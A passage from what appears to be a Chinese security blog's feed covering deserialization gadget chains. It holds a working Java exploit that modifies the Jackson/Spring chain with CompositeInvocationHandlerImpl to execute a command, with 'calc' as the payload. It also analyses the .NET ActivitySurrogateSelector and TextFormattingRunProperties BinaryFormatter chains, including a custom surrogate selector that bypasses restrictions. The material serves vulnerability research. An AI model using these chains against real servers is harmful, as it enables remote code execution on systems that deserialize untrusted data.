<h2 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h2><p>在<code>JSON1</code>的例子中我们使用了<code>CompositeInvocationHandlerImpl</code>根据方法声明类选择不同的<code>invocationHandler</code>对方法进行处理，其目的是为了屏蔽<code>getCompositeType</code>调用异常，<br>同样的在<code>Jackson</code>中也存在方法调用异常，不过在这里利用的却是反射获取代理类的特性。那么是否可以将<code>CompositeInvocationHandlerImpl</code>用于<code>Jackson</code>中呢？<br>以下是对原始的<code>Jackson</code>链进行改造后的代码。  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> ClassPool.getDefault().get(<span class="string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        ctClass.removeMethod(writeReplace);</span><br><span class="line">        ctClass.toClass();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        AdvisedSupport advisedSupport = new AdvisedSupport();</span></span><br><span class="line"><span class="comment">//        advisedSupport.setTarget(templates);</span></span><br><span class="line"><span class="comment">//        Constructor constructor = Class.forName(&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;).getConstructor(AdvisedSupport.class);</span></span><br><span class="line"><span class="comment">//        constructor.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);</span></span><br><span class="line"><span class="comment">//        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]&#123;Templates.class&#125;, handler);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">AdvisedSupport</span> <span class="variable">as</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AdvisedSupport</span>();</span><br><span class="line">        as.setTarget(templates);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">delegateInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) Reflections.newInstance(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;as&#125;);</span><br><span class="line">        <span class="comment">// 此处传入到JdkDynamicAopProxy中的参数也为as，因为StylesheetDomHandler只是用来充数的，其功能并不重要，重要是有而不是功能，因为并不会有方法调用会触发到该处理器的invoke方法</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">StylesheetDomHandler</span> <span class="operator">=</span> (InvocationHandler) Reflections.newInstance(<span class="string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;as&#125;);</span><br><span class="line">        Class&lt;?&gt;[] allIfaces = (Class[])((Class[]) Array.newInstance(Class.class, <span class="number">2</span>));</span><br><span class="line">        allIfaces[<span class="number">0</span>] = Serializable.class;</span><br><span class="line">        allIfaces[<span class="number">1</span>] = DOM.class;</span><br><span class="line">        <span class="comment">// 创建代理类同时代理DOM接口以及Serializable接口，因为getStylesheetDOM方法需要响应一个 DOM 类型对象，但是DOM的几个实现类都没有实现Serializable接口不可序列化</span></span><br><span class="line">        <span class="comment">// 所以需要同时代理 Serializable 接口</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, StylesheetDomHandler);</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">cdsInvocationHandler</span> <span class="operator">=</span> Gadgets.createMemoizedInvocationHandler(Gadgets.createMap(<span class="string">&quot;getStylesheetDOM&quot;</span>, o));</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler)Reflections.newInstance(<span class="string">&quot;com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="comment">// getStylesheetDOM的定义类为 TemplatesImpl 所以这里通过 TemplatesImpl.class 索引</span></span><br><span class="line">        <span class="comment">// 当getStylesheetDOM方法被调用是就会使用 cdsInvocationHandler 来进行实际的方法调用</span></span><br><span class="line">        <span class="comment">// cdsInvocationHandler 是一个 AnnotationInvocationHandler 对象可以用来替换返回对象类型。</span></span><br><span class="line">        ((Map)Reflections.getFieldValue(invocationHandler, <span class="string">&quot;classToInvocationHandler&quot;</span>)).put(TemplatesImpl.class, cdsInvocationHandler);</span><br><span class="line">        Reflections.setFieldValue(invocationHandler, <span class="string">&quot;defaultHandler&quot;</span>, delegateInvocationHandler);</span><br><span class="line">        <span class="type">Templates</span> <span class="variable">cdsProxy</span> <span class="operator">=</span> Gadgets.createProxy(invocationHandler, Templates.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(cdsProxy);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(val, <span class="string">&quot;val&quot;</span>, node);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] serialize = Serializer.serialize(val);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialize);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>运行修改后的<code>Jackson</code>链，正常弹出计算器，同时在日志中同样可以查看目标方法被成功调用<br><img src="/archives/42eb2c82/002.png"><br>在<code>jdk8u71</code>以下版本的运行环境中该修改可以成功运行，但在之后的版本中该修改是不能成功运行的，原因在于使用了<code>AnnotationInvocationHandler</code>来替换<code>getStylesheetDOM</code>的响应结果，<br><code>AnnotationInvocationHandler</code>在<code>jdk8u71</code>后被增加了新的限制，其只能代理使用了注解的方法，如：<code>@Override</code> 注解等。在<code>JSON1</code>链中我们代理的<code>getCompositeType</code>方法便存在注解<code>@Override</code>，所以不受<code>jdk</code>版本限制。  </p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>随着技术的发展以及JDK不断地更新，<code>AnnotationInvocationHandler</code>的使用被加上了限制，在jdk8u71后已经不再能够被随意使用。虽然如此，利用动态代理思想解决问题的思路是一以贯之的。<br>在不同的实践中也可能存在着其他更具利用价值的<code>InvocationHandler</code>值得我们去发掘。攻防对抗就是这样魔高一丈道高一尺，只有在攻与防的不断对抗中砥砺前行才能发现更多有效的思路与技巧。</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>动态代理</tag>
        <tag>Jackson</tag>
        <tag>JSON1</tag>
        <tag>Spring1</tag>
      </tags>
  </entry>
  <entry>
    <title>BinaryFormatter反序列化漏洞之ActivitySurrogateSelector利用链</title>
    <url>/archives/6f1feaf8.html</url>
    <content><![CDATA[<h1 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h1><p>关于序列化与反序列化过程中使用的代理选择器以及代理这里就不再介绍了，代理（Surrogate）可以使得不能被序列化的类被序列化，具体的操作需要用户自行实现一个<code>ISerializationSurrogate</code>接口并实现其<code>GetObjectData</code>以及<code>SetObjectData</code>方法。  </p>
<span id="more"></span>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.Serialization.Formatters.Binary;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Test</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Personal</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Name;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">int</span> Age;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">PersonalSurrogate</span> : <span class="title">ISerializationSurrogate</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params"><span class="built_in">object</span> obj, SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Personal personal = (Personal)obj;</span><br><span class="line">            info.AddValue(<span class="string">&quot;Name&quot;</span>, personal.Name);</span><br><span class="line">            info.AddValue(<span class="string">&quot;Age&quot;</span>, personal.Age);</span><br><span class="line">            info.AddValue(<span class="string">&quot;Address&quot;</span>, personal.Address);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">object</span> <span class="title">SetObjectData</span>(<span class="params"><span class="built_in">object</span> obj, SerializationInfo info, StreamingContext context, ISurrogateSelector selector</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Personal personal = (Personal)obj;</span><br><span class="line">            personal.Name = info.GetString(<span class="string">&quot;Name&quot;</span>);</span><br><span class="line">            personal.Age = info.GetInt32(<span class="string">&quot;Age&quot;</span>);</span><br><span class="line">            personal.Address = info.GetString(<span class="string">&quot;Address&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> personal;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">SurrogateTest</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] <span class="keyword">args</span></span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            Personal personal = <span class="keyword">new</span> Personal();</span><br><span class="line">            BinaryFormatter binaryFormatter = <span class="keyword">new</span> BinaryFormatter();</span><br><span class="line">            PersonalSurrogate personalSurrogate = <span class="keyword">new</span> PersonalSurrogate();</span><br><span class="line">            SurrogateSelector surrogateSelector = <span class="keyword">new</span> SurrogateSelector();</span><br><span class="line">            surrogateSelector.AddSurrogate(<span class="keyword">typeof</span>(Personal), <span class="keyword">new</span> StreamingContext(StreamingContextStates.All), personalSurrogate);</span><br><span class="line">            binaryFormatter.SurrogateSelector = surrogateSelector;</span><br><span class="line">            MemoryStream memoryStream = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">            binaryFormatter.Serialize(memoryStream, personal);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在上面的例子中<code>personal</code>既没有实现<code>ISerializable</code>接口也没有被<code>Serilizable</code>特性修饰，正常来说是不能被序列化以及反序列化的，不过我们通过创建<code>SurrogateSelector</code>并设置<code>Surrogate</code>来实现<code>Personal</code>对象的正确序列化与反序列化。<br>通过<code>Surrogate</code>的特性我们便可以在反序列化漏洞的利用中使用哪些正常来说不可以被序列化与反序列化的类型。不过从上面的代码中我们也知道，要想实现对某个特定的不可序列化类的序列化需要我们在服务端创建对应的<code>Surrogate</code>并实现<code>ISerializationSurrogate</code>接口，<br>然后在序列化过程中进行配置，而服务端的代码逻辑是我们在攻击过程中影响不了的，这样看起来<code>Suggogate</code>并没有用武之地。<br>天无绝人之路，存在这样一个特殊的<code>SurrogateSeletor</code> <code>ActivitySurrogateSelector</code> 其<code>GetSurrogate</code>方法在特定条件下可以返回一个<code>ObjectSurrogate</code>类型的<code>Surrogate</code>  </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">override</span> ISerializationSurrogate <span class="title">GetSurrogate</span>(<span class="params">Type type, StreamingContext context, <span class="keyword">out</span> ISurrogateSelector selector</span>)</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (type == <span class="literal">null</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">throw</span> <span class="keyword">new</span> ArgumentNullException(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			selector = <span class="keyword">this</span>;</span><br><span class="line">			ISerializationSurrogate serializationSurrogate = <span class="literal">null</span>;</span><br><span class="line">			<span class="built_in">bool</span> flag;</span><br><span class="line">			<span class="keyword">lock</span> (ActivitySurrogateSelector.surrogateCache)</span><br><span class="line">			&#123;</span><br><span class="line">				flag = ActivitySurrogateSelector.surrogateCache.TryGetValue(type, <span class="keyword">out</span> serializationSurrogate);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (flag)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (serializationSurrogate != <span class="literal">null</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">return</span> serializationSurrogate;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">base</span>.GetSurrogate(type, context, <span class="keyword">out</span> selector);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (<span class="keyword">typeof</span>(Activity).IsAssignableFrom(type))</span><br><span class="line">				&#123;</span><br><span class="line">					serializationSurrogate = <span class="keyword">this</span>.activitySurrogate;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span>(ActivityExecutor).IsAssignableFrom(type))</span><br><span class="line">				&#123;</span><br><span class="line">					serializationSurrogate = <span class="keyword">this</span>.activityExecutorSurrogate;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span>(IDictionary&lt;DependencyProperty, <span class="built_in">object</span>&gt;).IsAssignableFrom(type))</span><br><span class="line">				&#123;</span><br><span class="line">					serializationSurrogate = <span class="keyword">this</span>.dependencyStoreSurrogate;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span>(XmlDocument).IsAssignableFrom(type))</span><br><span class="line">				&#123;</span><br><span class="line">					serializationSurrogate = <span class="keyword">this</span>.domDocSurrogate;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span>(Queue) == type)</span><br><span class="line">				&#123;</span><br><span class="line">					serializationSurrogate = <span class="keyword">this</span>.queueSurrogate;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span>(Guid) == type)</span><br><span class="line">				&#123;</span><br><span class="line">					serializationSurrogate = <span class="keyword">this</span>.simpleTypesSurrogate;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span>(ActivityBind).IsAssignableFrom(type))</span><br><span class="line">				&#123;</span><br><span class="line">					serializationSurrogate = <span class="keyword">this</span>.objectSurrogate;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span>(DependencyObject).IsAssignableFrom(type))</span><br><span class="line">				&#123;</span><br><span class="line">					serializationSurrogate = <span class="keyword">this</span>.objectSurrogate;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">lock</span> (ActivitySurrogateSelector.surrogateCache)</span><br><span class="line">				&#123;</span><br><span class="line">					ActivitySurrogateSelector.surrogateCache[type] = serializationSurrogate;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (serializationSurrogate != <span class="literal">null</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">return</span> serializationSurrogate;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">base</span>.GetSurrogate(type, context, <span class="keyword">out</span> selector);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<p>从上面的代码可知要想获取<code>ObjectSurrogate</code>类型的<code>Surrogate</code>需要满足序列化类为<code>DependencyObject</code>或者<code>ActivityBind</code>的子类，这样就限制了我们的发挥。<br>不过虽然<code>ActivitySurrogateSelector</code>的<code>GetSurrogate</code>方法有这个限制，但我们可以自定义一个<code>SurrogateSelector</code>来绕开这个限制，从而完成使用<code>ObjectSurrogate</code>的<code>getObjectData</code>方法来进行序列化。  </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">override</span> ISerializationSurrogate <span class="title">GetSurrogate</span>(<span class="params">Type type, StreamingContext context, <span class="keyword">out</span> ISurrogateSelector selector</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            selector = <span class="keyword">this</span>;</span><br><span class="line">            <span class="keyword">if</span> (!type.IsSerializable)</span><br><span class="line">            &#123;</span><br><span class="line">                Type t = Type.GetType(<span class="string">&quot;System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> (ISerializationSurrogate)Activator.CreateInstance(t);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">base</span>.GetSurrogate(type, context, <span class="keyword">out</span> selector);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>这时候就又存在问题了，这不还是在改变序列化的过程吗，如果反序列化的过程没有设置对应的<code>Surrogate</code>不还是不能成功进行漏洞利用吗？<br>这里就不得不提到<code>ObjectSurrogate</code>神奇的<code>GetObjectData</code>方法了。<br>在该方法中调用了<code>info.SetType</code>设置了反序列化过程中<code>obj</code>的实际类型为<code>ActivitySurrogateSelector.ObjectSurrogate.ObjectSerializedRef</code>，也就是说发序列化过程中将不会立即得到原始的obj，而是先得到<code>ObjectSerializedRef</code>类型。</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params"><span class="built_in">object</span> obj, SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">			&#123;</span><br><span class="line">				info.AddValue(<span class="string">&quot;type&quot;</span>, obj.GetType());</span><br><span class="line">				<span class="built_in">string</span>[] array = <span class="literal">null</span>;</span><br><span class="line">				MemberInfo[] serializableMembers = FormatterServicesNoSerializableCheck.GetSerializableMembers(obj.GetType(), <span class="keyword">out</span> array);</span><br><span class="line">				<span class="built_in">object</span>[] objectData = FormatterServices.GetObjectData(obj, serializableMembers);</span><br><span class="line">				info.AddValue(<span class="string">&quot;memberDatas&quot;</span>, objectData);</span><br><span class="line">				info.SetType(<span class="keyword">typeof</span>(ActivitySurrogateSelector.ObjectSurrogate.ObjectSerializedRef));</span><br><span class="line">			&#125;</span><br></pre></td></tr></table></figure>
<p><code>ObjectSerializedRef</code>实现了	<code>IObjectReference</code>以及<code>IDeserializationCallback</code>接口，这两个接口分别包括方法<code>GetRealObject</code>以及<code>OnDeserialization</code>方法。<br><code>GetRealObject</code>与<code>OnDeserialization</code>方法均在对象图构造完成后执行，即<code>ObjectSerializedRef</code>对象构造完成后执行，且<code>GetRealObject</code>方法先于<code>OnDeserialization</code>方法执行，主要作用是控制反序列化后的实际对象返回，<br>而<code>OnDeserialization</code>则用于在所有字段都恢复后进行初始化或验证操作。<br><code>GetRealObject</code>方法调用<code>GetUninitializedObject</code>通过<code>this.type</code>构造目标对象，而<code>this.type</code>我们通过<code>ObjectSurrogate</code>的<code>getObjectData</code>方法可以知道是哪个最初序列化的不可序列化的类，在我们的例子中即<code>Personal</code>。  </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="built_in">object</span> IObjectReference.GetRealObject(StreamingContext context)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (<span class="keyword">this</span>.returnedObject == <span class="literal">null</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">this</span>.returnedObject = FormatterServices.GetUninitializedObject(<span class="keyword">this</span>.type);</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">return</span> <span class="keyword">this</span>.returnedObject;</span><br><span class="line">				&#125;</span><br></pre></td></tr></table></figure>
<p><code>OnDeserialization</code>方法用于还原<code>Personal</code>对象的成员变量的值。</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> IDeserializationCallback.OnDeserialization(<span class="built_in">object</span> sender)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (<span class="keyword">this</span>.returnedObject != <span class="literal">null</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="built_in">string</span>[] array = <span class="literal">null</span>;</span><br><span class="line">						MemberInfo[] serializableMembers = FormatterServicesNoSerializableCheck.GetSerializableMembers(<span class="keyword">this</span>.type, <span class="keyword">out</span> array);</span><br><span class="line">						FormatterServices.PopulateObjectMembers(<span class="keyword">this</span>.returnedObject, serializableMembers, <span class="keyword">this</span>.memberDatas);</span><br><span class="line">						<span class="keyword">this</span>.returnedObject = <span class="literal">null</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br></pre></td></tr></table></figure>
<p>由此我们知道了我们可以通过自定义<code>SurroGateSeletor</code>返回<code>ObjectSurrogate</code>实现对不可序列化对象的序列化，并且这样序列化的结果字符串即便在反序列化过程中<code>BinarryFormatter</code>没有设置对应的<code>SurroGateSeletor</code>的情况下也能被成功反序列化，<br>因为其使用了<code>ObjectSerializedRef</code>这个可以序列化以及反序列化的类对那些不可序列化的类进行了包装。</p>
]]></content>
      <categories>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>C#</tag>
        <tag>BinnaryFormatter</tag>
        <tag>ActivitySurrogateSelector</tag>
      </tags>
  </entry>
  <entry>
    <title>从三味书屋到百草堂、从XmlSerializer到BinnaryFormatter之BinaryFormatter反序列化漏洞TextFormattingRunProperties利用链</title>
    <url>/archives/323962a4.html</url>
    <content><![CDATA[<h1 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h1><p><code>TextFormattingRunProperties</code>实现了<code>System.Runtime.Serialization.ISerializable</code>接口，故其在序列化以及反序列化过程中会自动执行<code>GetObjectData</code>以及特定的构造方法<code>internal TextFormattingRunProperties(SerializationInfo info, StreamingContext context)</code><br><img src="/archives/323962a4/0880c08b011096a4b93d.png" alt="img1"><br>我们直接从反序列化时执行的特殊构造方法创建对象的过程开始。<br>在调用构造方法创建对象期间会调用<code>GetObjectFromSerializationInfo</code>方法从<code>serializationInfo</code>中获取属性值。  </p>
<span id="more"></span>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">internal</span> <span class="title">TextFormattingRunProperties</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">this</span>._foregroundBrush = (Brush)<span class="keyword">this</span>.GetObjectFromSerializationInfo(<span class="string">&quot;ForegroundBrush&quot;</span>, info);</span><br><span class="line">	<span class="keyword">this</span>._backgroundBrush = (Brush)<span class="keyword">this</span>.GetObjectFromSerializationInfo(<span class="string">&quot;BackgroundBrush&quot;</span>, info);</span><br><span class="line">	<span class="keyword">this</span>._size = (<span class="built_in">double</span>?)<span class="keyword">this</span>.GetObjectFromSerializationInfo(<span class="string">&quot;FontRenderingSize&quot;</span>, info);</span><br><span class="line">	<span class="keyword">this</span>._hintingSize = (<span class="built_in">double</span>?)<span class="keyword">this</span>.GetObjectFromSerializationInfo(<span class="string">&quot;FontHintingSize&quot;</span>, info);</span><br><span class="line">	<span class="keyword">this</span>._foregroundOpacity = (<span class="built_in">double</span>?)<span class="keyword">this</span>.GetObjectFromSerializationInfo(<span class="string">&quot;ForegroundOpacity&quot;</span>, info);</span><br><span class="line">	<span class="keyword">this</span>._backgroundOpacity = (<span class="built_in">double</span>?)<span class="keyword">this</span>.GetObjectFromSerializationInfo(<span class="string">&quot;BackgroundOpacity&quot;</span>, info);</span><br><span class="line">	<span class="keyword">this</span>._italic = (<span class="built_in">bool</span>?)<span class="keyword">this</span>.GetObjectFromSerializationInfo(<span class="string">&quot;Italic&quot;</span>, info);</span><br><span class="line">	<span class="keyword">this</span>._bold = (<span class="built_in">bool</span>?)<span class="keyword">this</span>.GetObjectFromSerializationInfo(<span class="string">&quot;Bold&quot;</span>, info);</span><br><span class="line">	<span class="keyword">this</span>._textDecorations = (TextDecorationCollection)<span class="keyword">this</span>.GetObjectFromSerializationInfo(<span class="string">&quot;TextDecorations&quot;</span>, info);</span><br><span class="line">	<span class="keyword">this</span>._textEffects = (TextEffectCollection)<span class="keyword">this</span>.GetObjectFromSerializationInfo(<span class="string">&quot;TextEffects&quot;</span>, info);</span><br><span class="line">	<span class="built_in">string</span> text = (<span class="built_in">string</span>)<span class="keyword">this</span>.GetObjectFromSerializationInfo(<span class="string">&quot;CultureInfoName&quot;</span>, info);</span><br><span class="line">	<span class="keyword">this</span>._cultureInfo = ((text == <span class="literal">null</span>) ? <span class="literal">null</span> : <span class="keyword">new</span> CultureInfo(text));</span><br><span class="line">	FontFamily fontFamily = <span class="keyword">this</span>.GetObjectFromSerializationInfo(<span class="string">&quot;FontFamily&quot;</span>, info) <span class="keyword">as</span> FontFamily;</span><br><span class="line">	<span class="built_in">bool</span> flag = fontFamily != <span class="literal">null</span>;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>GetObjectFromSerializationInfo</code>方法中会调用<code>XamlReader.Parse</code>方法对从<code>serializationInfo</code>获取的字符串进行解析，通过上一篇文章<a href="archives/ff457959.html">从三味书屋到百草堂，从XmlSerializer到BinnaryFormatter之XmlSerializer反序列化漏洞ObjectDataProvider利用链</a>我们知道<br><code>XamlReader</code>的<code>Parse</code>方法可以解析<code>XAML</code>字符串并导致命令执行。所以我们只需要将<code>TextFormattingRunProperties</code>某一个字段的值设置为符合<code>XamlReader</code>解析条件的<code>Payload</code>即可进行反序列化漏洞攻击。  </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="built_in">object</span> <span class="title">GetObjectFromSerializationInfo</span>(<span class="params"><span class="built_in">string</span> name, SerializationInfo info</span>)</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">string</span> @string = info.GetString(name);</span><br><span class="line">			<span class="built_in">bool</span> flag = @string == <span class="string">&quot;null&quot;</span>;</span><br><span class="line">			<span class="built_in">object</span> result;</span><br><span class="line">			<span class="keyword">if</span> (flag)</span><br><span class="line">			&#123;</span><br><span class="line">				result = <span class="literal">null</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				result = XamlReader.Parse(@string);</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br></pre></td></tr></table></figure>
<p><code>serializationInfo</code>中的值由<code>GetObjectData</code>方法在序列化的时候设置  </p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">GetObjectData</span>(<span class="params">SerializationInfo info, StreamingContext context</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">bool</span> flag = info == <span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">if</span> (flag)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> ArgumentNullException(<span class="string">&quot;info&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	info.AddValue(<span class="string">&quot;BackgroundBrush&quot;</span>, <span class="keyword">this</span>.BackgroundBrushEmpty ? <span class="string">&quot;null&quot;</span> : XamlWriter.Save(<span class="keyword">this</span>.BackgroundBrush));</span><br><span class="line">	info.AddValue(<span class="string">&quot;ForegroundBrush&quot;</span>, <span class="keyword">this</span>.ForegroundBrushEmpty ? <span class="string">&quot;null&quot;</span> : XamlWriter.Save(<span class="keyword">this</span>.ForegroundBrush));</span><br><span class="line">	info.AddValue(<span class="string">&quot;FontHintingSize&quot;</span>, <span class="keyword">this</span>.FontHintingEmSizeEmpty ? <span class="string">&quot;null&quot;</span> : XamlWriter.Save(<span class="keyword">this</span>.FontHintingEmSize));</span><br><span class="line">	